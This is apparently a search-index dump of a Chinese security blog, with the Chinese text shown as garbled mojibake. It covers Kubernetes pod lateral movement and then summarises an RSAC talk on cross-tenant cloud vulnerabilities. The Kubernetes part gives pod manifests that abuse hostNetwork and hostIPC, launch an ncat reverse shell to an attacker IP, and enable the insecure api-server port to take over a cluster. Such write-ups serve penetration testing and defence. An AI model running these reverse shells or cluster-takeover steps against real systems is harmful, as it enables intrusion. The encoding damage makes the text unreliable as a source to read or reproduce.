apiVersion: v1 kind: Pod metadata: name: hostnetwork-only labels: app: prod spec: hostNetwork: true containers: - name: hostnetwork-only image: ubuntu command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] nodeName: k8s-master å¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: hostnetwork-only-reverse labels: app: prod spec: hostNetwork: true containers: - name: hostnetwork-only-reverse image: raesene/ncat command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"ncat 192.168.88.138 4444 -e /bin/bash;\" ] nodeName: k8s-master 4.6.2 åæ¸—é€ 4.6.2.1 ç¯å¢ƒå‡†å¤‡ ä»¥è®¿é—® api-server çš„ 8080 ç«¯å£ä¸ºä¾‹ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œéœ€è¦ä¿®æ”¹ api-server çš„é…ç½®ï¼š vim /etc/kubernetes/manifests/kube-apiserver.yaml æ‰‹åŠ¨æ·»åŠ å¦‚ä¸‹ä¸¤è¡Œï¼š - --insecure-port=8080 - --insecure-bind-address=127.0.0.1 ç„¶åé‡å¯ api-server å³å¯ï¼š systemctl restart kubelet 4.6.2.2 æ¥ç®¡é›†ç¾¤ kubectl -s http://192.168.88.137:8080 get nodes ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:6","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.7 å¼€æ”¾ HostIPC æƒé™ IPC å‘½åç©ºé—´æ˜¯ä¸€ç§åœ¨åŒä¸€å°ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹ä¹‹é—´è¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„æœºåˆ¶ã€‚é€šè¿‡è®¾ç½® HostIPC æƒé™ï¼Œå¯ä»¥æ§åˆ¶ Pod æ˜¯å¦å¯ä»¥ä¸ä¸»æœºä¸Šçš„å…¶ä»–è¿›ç¨‹å…±äº« IPC å‘½åç©ºé—´ã€‚åœ¨ Kubernetes ä¸­ï¼Œæ¯ä¸ª Pod éƒ½æœ‰è‡ªå·±çš„ IPC å‘½åç©ºé—´ï¼ŒPod å†…çš„è¿›ç¨‹åªèƒ½ä¸åŒä¸€ Pod å†…çš„å…¶ä»–è¿›ç¨‹è¿›è¡Œ IPCï¼Œè€Œä¸èƒ½ç›´æ¥ä¸ä¸»æœºä¸Šçš„è¿›ç¨‹è¿›è¡Œ IPCã€‚ å¦‚æœå°† HostIPC è®¾ç½®ä¸º trueï¼Œåˆ™è¡¨ç¤ºè¯¥ Pod å…·æœ‰è®¿é—®ä¸»æœº IPC å‘½åç©ºé—´çš„æƒé™ï¼Œ Pod å†…çš„è¿›ç¨‹å¯ä»¥ä¸ä¸»æœºä¸Šçš„å…¶ä»–è¿›ç¨‹å…±äº« IPC å‘½åç©ºé—´ï¼Œä»è€Œå¯èƒ½å½±å“ä¸»æœºä¸Šçš„å…¶ä»–è¿›ç¨‹ã€‚ å¦‚æœä¸»æœºä¸Šçš„ä»»ä½•è¿›ç¨‹æˆ– pod ä¸­çš„ä»»ä½•è¿›ç¨‹ä½¿ç”¨äº†ä¸»æœºçš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼ˆå…±äº«å†…å­˜ã€ä¿¡å·æ•°ç»„ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¯»/å†™è¿™äº›æœºåˆ¶ã€‚æœ‰å¦‚ä¸‹å‡ ç§æ–¹æ³•è°¢è°¢ æŸ¥çœ‹ /dev/shm - æŸ¥çœ‹åœ¨è¿™ä¸ªå…±äº«å†…å­˜ä½ç½®æ˜¯å¦å­˜åœ¨ä»»ä½•æ–‡ä»¶ã€‚ æŸ¥çœ‹ç°æœ‰ IPC è®¾æ–½ - å¯ä»¥ä½¿ç”¨ /usr/bin/ipcs æ£€æŸ¥æ˜¯å¦æœ‰ IPC æ­£åœ¨ä½¿ç”¨ã€‚ åˆ›å»º Podsï¼š apiVersion: v1 kind: Pod metadata: name: hostipc-only labels: app: prod spec: hostIPC: true containers: - name: hostipc-only image: ubuntu command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] nodeName: k8s-master å¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: hostipc-only-reverse labels: app: pentest spec: hostIPC: true containers: - name: hostipc-only-reverse image: raesene/ncat command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"ncat 192.168.88.138 4444 -e /bin/bash;\" ] nodeName: k8s-master ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:7","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.8 æ— ä»»ä½•æƒé™ åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œæ€è·¯å°±æ¯”è¾ƒå¸¸è§„äº†ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š è®¿é—®äº‘ä¸Š metadata ä¿¡æ¯ï¼šå¦‚æœ Pod æ˜¯åœ¨äº‘ä¸Šæ‰˜ç®¡çš„ï¼Œå¯ä»¥å°è¯•è®¿é—® metadata ä¿¡æ¯ï¼Œå¯èƒ½ä¼šæœ‰ä¸€äº› IAM å‡­æ®æˆ– STS token ç­‰ã€‚ æƒé™é…ç½®ä¸å½“çš„ serviceaccountï¼šå¦‚æœå‘½åç©ºé—´çš„é»˜è®¤æœåŠ¡è´¦æˆ·è¢«æŒ‚è½½åˆ° Pod ä¸­çš„ /var/run/secrets/kubernetes.io/serviceaccount/tokenï¼Œå¹¶ä¸”æƒé™è®¾ç½®è¿‡å¤§ï¼Œå¯ä»¥ä½¿ç”¨è¯¥ä»¤ç‰Œæå‡æƒé™ã€‚ æœªæˆæƒæ¼æ´ï¼šé›†ç¾¤å†… api-server æœªæˆæƒã€kubelet æœªæˆæƒç­‰ã€‚ å†…æ ¸æ¼æ´æˆ– k8s æ¼æ´ï¼šå¦‚ CVE-2018-1002105ã€‚ åº”ç”¨æ¼æ´ï¼šå¯»æ‰¾ pod å†…å¯åŠ¨çš„åº”ç”¨è‡ªèº«æ¼æ´ã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:8","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5 å‚è€ƒ https://chat.openai.com/ https://tttang.com/archive/1465/ https://blog.csdn.net/u012986012/article/details/122712572 https://github.com/kvaps/kubectl-node-shell ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:5:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ 2023 å¹´çš„ RSAC ä¼šè®®ä¸Šä¸¤ä½æ¥è‡ª Wiz çš„å®‰å…¨ç ”ç©¶å‘˜ï¼Œåˆ†äº«äº†åä¸ºã€ŠTackling the Recent Rise of Cross-Tenant Vulnerabilitiesã€‹çš„è®®é¢˜ã€‚ä¸¤ä½ç ”ç©¶å‘˜æå‡ºä¸€ä¸ªæ–°å…´çš„æ”»å‡»æ–¹å‘ï¼Œå³è·¨ç§Ÿæˆ·æ¼æ´ï¼Œä»‹ç»ç›¸å…³æ¦‚å¿µï¼Œå¹¶åœ¨ç°ç½‘ç¯å¢ƒä¸­æŒ–æ˜ Google Cloudã€AWSã€Alibaba Cloud ç­‰è·¨ç§Ÿæˆ·æ¼æ´ï¼Œå½±å“å·¨å¤§ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 ç›¸å…³æ¦‚å¿µ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 å¤šç§Ÿæˆ·æŠ€æœ¯ å¤šç§Ÿæˆ·æŠ€æœ¯æ˜¯ä¸€ç§åœ¨äº‘è®¡ç®—ç¯å¢ƒä¸­å¹¿æ³›ä½¿ç”¨çš„æ¶æ„è®¾è®¡æ–¹æ³•ï¼Œç”¨äºåœ¨å•ä¸ªåº”ç”¨ç¨‹åºæˆ–æœåŠ¡ä¸­åŒæ—¶æ”¯æŒå¤šä¸ªç‹¬ç«‹çš„ç§Ÿæˆ·æˆ–ç”¨æˆ·ã€‚ åœ¨ä¼ ç»Ÿçš„å•ç§Ÿæˆ·æ¶æ„ä¸­ï¼Œæ¯ä¸ªåº”ç”¨ç¨‹åºæˆ–æœåŠ¡åªä¸ºä¸€ä¸ªç§Ÿæˆ·æä¾›æœåŠ¡ã€‚è€Œåœ¨å¤šç§Ÿæˆ·æ¶æ„ä¸­ï¼Œåº”ç”¨ç¨‹åºæˆ–æœåŠ¡è¢«è®¾è®¡æˆå¯ä»¥åŒæ—¶ä¸ºå¤šä¸ªç§Ÿæˆ·æä¾›æœåŠ¡ï¼Œè€Œä¸”æ¯ä¸ªç§Ÿæˆ·éƒ½è¢«éš”ç¦»åœ¨å½¼æ­¤ä¹‹é—´ï¼Œå½¼æ­¤ç‹¬ç«‹ä¸”äº’ä¸å¹²æ‰°ã€‚ å¤šç§Ÿæˆ·æŠ€æœ¯çš„å…³é”®ç‰¹ç‚¹æ˜¯èµ„æºå…±äº«å’Œéš”ç¦»ã€‚å¤šä¸ªç§Ÿæˆ·å…±äº«ç›¸åŒçš„åŸºç¡€è®¾æ–½ï¼ŒåŒ…æ‹¬ç¡¬ä»¶ã€ç½‘ç»œå’Œè½¯ä»¶ç»„ä»¶ç­‰ï¼Œä»è€Œå®ç°èµ„æºçš„é«˜æ•ˆåˆ©ç”¨ã€‚åŒæ—¶ï¼Œæ¯ä¸ªç§Ÿæˆ·ä¹‹é—´çš„æ•°æ®å’Œè¿è¡Œç¯å¢ƒæ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œç¡®ä¿ç§Ÿæˆ·ä¹‹é—´çš„å®‰å…¨æ€§å’Œéšç§æ€§ã€‚ å¤šç§Ÿæˆ·æ¶æ„é€šå¸¸åœ¨å¹³å°å³æœåŠ¡ï¼ˆPaaSï¼‰å’Œè½¯ä»¶å³æœåŠ¡ï¼ˆSaaSï¼‰ç­‰äº‘æœåŠ¡æ¨¡å‹ä¸­å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚åœ¨è¿™äº›æ¨¡å‹ä¸­ï¼Œäº‘æä¾›å•†ä¸ºå¤šä¸ªç§Ÿæˆ·æä¾›ç›¸åŒçš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡å®ä¾‹ï¼Œè€Œæ¯ä¸ªç§Ÿæˆ·éƒ½å¯ä»¥å®šåˆ¶å’Œç®¡ç†è‡ªå·±çš„æ•°æ®å’Œé…ç½®ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:1:1","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 è·¨ç§Ÿæˆ·æ¼æ´ åœ¨äº‘ä¸Šå¤šç§Ÿæˆ·æŠ€æœ¯å¹¿æ³›åº”ç”¨çš„åœºæ™¯ä¸‹ï¼Œè·¨ç§Ÿæˆ·æ¼æ´åº”è¿è€Œç”Ÿã€‚è·¨ç§Ÿæˆ·æ¼æ´æ˜¯æŒ‡å­˜åœ¨äºå¤šç§Ÿæˆ·ç¯å¢ƒä¸­çš„å®‰å…¨æ¼æ´ï¼Œå¯èƒ½å¯¼è‡´ä¸€ä¸ªç§Ÿæˆ·èƒ½å¤Ÿè®¿é—®æˆ–å¹²æ‰°å…¶ä»–ç§Ÿæˆ·çš„æ•°æ®æˆ–èµ„æºã€‚è¿™ç§æ¼æ´å¯èƒ½ä¼šå¼•èµ·ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è·¨ç§Ÿæˆ·æ¼æ´è·å–ç§Ÿæˆ·çš„æ•°æ®æˆ–ç³»ç»Ÿæ§åˆ¶æƒï¼Œä¸¥é‡ç ´åäº†ç§Ÿæˆ·ä¹‹é—´çš„éš”ç¦»æ€§å’Œå®‰å…¨æ€§ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:1:2","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 ç§Ÿæˆ·éš”ç¦»çš„å®ç°æ–¹å¼ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 é€»è¾‘éš”ç¦» é€»è¾‘éš”ç¦»æ˜¯ä¸€ç§ååˆ†ç®€å•çš„ç§Ÿæˆ·éš”ç¦»æ–¹å¼ï¼Œç§Ÿæˆ·åœ¨å…±äº«æ•°æ®åº“å®ä¾‹ä¸­æ‹¥æœ‰ä¸€ä¸ªä¸“ç”¨æ•°æ®åº“ã€‚ä½†æ˜¯æ¯ä¸ªå®¢æˆ·éƒ½æ‹¥æœ‰è‡ªå·±çš„å‡­æ®ï¼Œæ¥ä¿è¯ä¸åŒç”¨æˆ·ä¹‹é—´çš„éš”ç¦»ã€‚ è¿™ç§éš”ç¦»æ–¹å¼åœ¨å·¥ä¸šå®è·µä¸­æœ‰è‰¯å¥½çš„å¯æ“ä½œæ€§ï¼Œè½¯ä»¶æ¶æ„ç®€å•ä¸”æ˜“äºå®ç°ï¼Œæˆæœ¬è¾ƒä½ã€‚ä½†æ˜¯ä¸€æ—¦å‡ºç°å•ç‚¹æ•…éšœï¼Œå°†å½±å“æ•°æ®åº“å®ä¾‹ä¸‹çš„æ‰€æœ‰ç§Ÿæˆ·ã€‚ æ­¤å¤–ï¼Œå½“ä¸€ä¸ªæ•°æ®åº“è¢«æ”»å‡»è€…æ”»ç ´åï¼Œæ¯”å¦‚æ”»å‡»è€…ä»å½“å‰ç§Ÿæˆ·æƒé™æå‡åˆ°ç®¡ç†å‘˜æƒé™ï¼Œæ”»å‡»è€…å°±å¯ä»¥è®¿é—®å…¶å®ƒç§Ÿæˆ·çš„æ•°æ®ã€‚æ­¤å¤–ï¼Œå¯¹äºä¸€äº›è¿ç»´äººå‘˜æ¥è¯´ï¼Œåœ¨é…ç½®æ•°æ®åº“å®ä¾‹çš„æ—¶å€™ï¼Œå¾ˆå®¹æ˜“å‡ºç°é…ç½®ä¸å½“çš„é—®é¢˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ç”šè‡³ä¸å¿…åˆ©ç”¨ 0-day æå‡æƒé™ï¼Œé€šè¿‡åªæ˜¯æ»¥ç”¨æŸäº›é”™è¯¯é…ç½®ï¼Œå°±å¯ä»¥è¾¾åˆ°è®¿é—®å…¶å®ƒç”¨æˆ·æ•°æ®çš„ç›®çš„ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 åŸºäºå®¹å™¨çš„éš”ç¦» åŸºäºå®¹å™¨çš„éš”ç¦»ç›¸æ¯”äºä¸Šé¢çš„éš”ç¦»æ–¹æ³•å…·æœ‰ä¸€å®šä¼˜åŠ¿ã€‚åœ¨è¿™ç§éš”ç¦»æ–¹æ³•ä¸­ï¼Œä¸å†æ˜¯å¤šä¸ªå®¢æˆ·å…±äº«åŒä¸€ä¸ªæ•°æ®åº“å®ä¾‹ï¼Œæ¯ä¸ªå®¢æˆ·éƒ½æœ‰è‡ªå·±çš„æ•°æ®åº“å®ä¾‹ï¼Œåœ¨ç›¸å¯¹ç‹¬ç«‹çš„å®¹å™¨å†…è¿è¡Œï¼Œ å¹¶ä¸”å¤šä¸ªå®¢æˆ·å¯èƒ½å…±äº«åŒä¸€ä¸ªè™šæ‹Ÿæœºã€‚ è¿™ç§éš”ç¦»æ–¹å¼åŒæ ·ç›¸å¯¹ä¾¿å®œä¸”æ˜“äºå®æ–½ã€‚å½“æ”»å‡»è€…æƒ³è¦çªç ´éš”ç¦»æ—¶ï¼Œéœ€è¦æ‰“ç ´ä¸¤å±‚å®‰å…¨è¾¹ç•Œï¼Œå³ï¼šç¬¬ä¸€å±‚æ•°æ®åº“ï¼Œä¸ä¸Šä¸€ç§æ–¹å¼ç›¸åŒï¼›ç¬¬äºŒå±‚å®¹å™¨ã€‚ä¸€æ—¦æ”»å‡»è€…ä»å®¹å™¨ä¸­é€ƒé€¸å‡ºæ¥ï¼Œå°±å¯ä»¥åœ¨è™šæ‹Ÿæœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œåœ¨è™šæ‹Ÿæœºä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶å®ƒç§Ÿæˆ·çš„å®¹å™¨ï¼Œå¹¶èƒ½å¤Ÿè®¿é—®ä»–ä»¬çš„æ•°æ®ã€‚ è™½ç„¶è¿™ç§éš”ç¦»æ–¹å¼çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªæ›´å¥½çš„æ–¹æ³•ï¼Œä¸å‰é¢çš„æ–¹æ³•ç›¸æ¯”ï¼Œå®ƒä»æœ‰å…¶ç¼ºç‚¹ã€‚æ­£å¦‚ä¸€äº›å®‰å…¨ç ”ç©¶äººå‘˜æ‰€è®¤ä¸ºçš„é‚£æ ·ï¼Œå®¹å™¨ä¸è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å®‰å…¨å±éšœï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ Linux éƒ½ä¼šå‘å¸ƒä¸€äº›å†…æ ¸æ¼æ´ï¼Œéƒ¨åˆ†æ¼æ´é€šè¿‡æ­¦å™¨åŒ–ï¼Œå¯ä»¥è¢«ç”¨æ¥å®¹å™¨é€ƒé€¸ã€‚ Wiz å›¢é˜Ÿé’ˆå¯¹é˜¿é‡Œäº‘æ•°æ®åº“æŠ«éœ²äº†ä¸€ä¸ªæŠ¥å‘Šï¼Œå…·ä½“ç»†èŠ‚åœ¨ç¬¬ä¸‰ç« èŠ‚è¿›è¡Œé˜è¿°ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 åŸºäºè™šæ‹Ÿæœºçš„éš”ç¦» ç¬¬ä¸‰ç§éš”ç¦»ç§Ÿæˆ·çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯å¤§å¤šæ•°æœåŠ¡æä¾›å•†å€¾å‘äºåšçš„ï¼Œå³ï¼šåŸºäºè™šæ‹Ÿæœºçš„éš”ç¦»ã€‚åœ¨è¿™ç§éš”ç¦»æ–¹æ³•ä¸­ï¼Œæ¯ä¸ªç§Ÿæˆ·éƒ½æœ‰è‡ªå·±çš„æ•°æ®åº“å®ä¾‹ï¼Œåœ¨å•ç‹¬çš„ä¸“ç”¨è™šæ‹Ÿæœºä¸­è¿è¡Œã€‚å› æ­¤ï¼Œå®¢æˆ·ç°åœ¨å…±äº«çš„æ˜¯ç‰©ç†è®¡ç®—èµ„æºï¼Œè€Œä¸æ˜¯åƒä¹‹å‰çš„éš”ç¦»æ–¹æ³•é‚£æ ·ï¼Œå…±äº«ä¸€ä¸ªè™šæ‹Ÿæœºã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œæ”»å‡»è€…æƒ³è¦æ‰“ç ´è¿™ç§éš”ç¦»æ–¹å¼ï¼Œéœ€è¦æ‰“ç ´ä¸¤åˆ°ä¸‰å±‚å®‰å…¨è¾¹ç•Œï¼Œç¬¬ä¸€å±‚ç„¶éœ€è¦æ•°æ®åº“æ¼æ´ï¼Œèƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚ç¬¬äºŒå±‚å¯èƒ½éœ€è¦è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œç¬¬ä¸‰å±‚è™šæ‹Ÿæœºæ¼æ´ã€‚é€šå¸¸æ¥è¯´ï¼ŒVM é€ƒé€¸æ¼æ´æ›´éš¾æŒ–æ˜ã€‚ å½“æ¯ä¸€ä¸ªç§Ÿæˆ·éƒ½æœ‰è‡ªå·±ä¸“ç”¨çš„è™šæ‹Ÿæœºï¼Œäº‘æœåŠ¡æä¾›å•†çš„æˆæœ¬å˜å¾—ç›¸å½“æ˜‚è´µã€‚ä¸æ­¤åŒæ—¶ï¼Œæ¶æ„ä¹Ÿå¼€å§‹å˜å¾—å¾ˆéš¾ç»´æŠ¤ï¼Œéš”ç¦»æœåŠ¡è¶Šå¼ºï¼Œè¶Šéš¾å®é™…è°ƒè¯•æœåŠ¡ï¼Œå¹¶è§£å†³æœåŠ¡ä¸­çš„é—®é¢˜ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:2:3","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 çœŸå®ç¯å¢ƒä¸­çš„æ¼æ´æ¡ˆä¾‹ 